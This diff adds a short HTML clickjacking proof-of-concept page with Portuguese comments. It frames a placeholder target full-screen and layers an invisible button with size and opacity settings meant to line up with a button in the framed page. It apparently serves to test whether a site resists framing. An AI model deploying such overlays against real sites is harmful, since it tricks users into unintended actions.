@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 1.0; /* Ajuste a opacidade para ver melhor o conteúdo */
+            z-index: 2;
+            border: none;
+        }
+
+        .click-me {
+            position: absolute;
+            top: 50%; /* Centraliza verticalmente */
+            left: 50%; /* Centraliza horizontalmente */
+            transform: translate(-50%, -50%); /* Ajusta para o centro exato */
+            z-index: 1;
+            width: 300px; /* Ajuste para o tamanho do botão no iframe */
+            height: 50px; /* Ajuste para o tamanho do botão no iframe */
+            background-color: transparent; /* Tornando o botão invisível */
+            border: none;
+            cursor: pointer;
+        }
+
+        @media (max-width: 600px) {
+            .click-me {
+                width: 250px; /* Ajuste para telas menores */
+                height: 40px; /* Ajuste para telas menores */
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <button class="click-me"></button>
+    <iframe src="teste"></iframe>
+</body>
+
+</html>
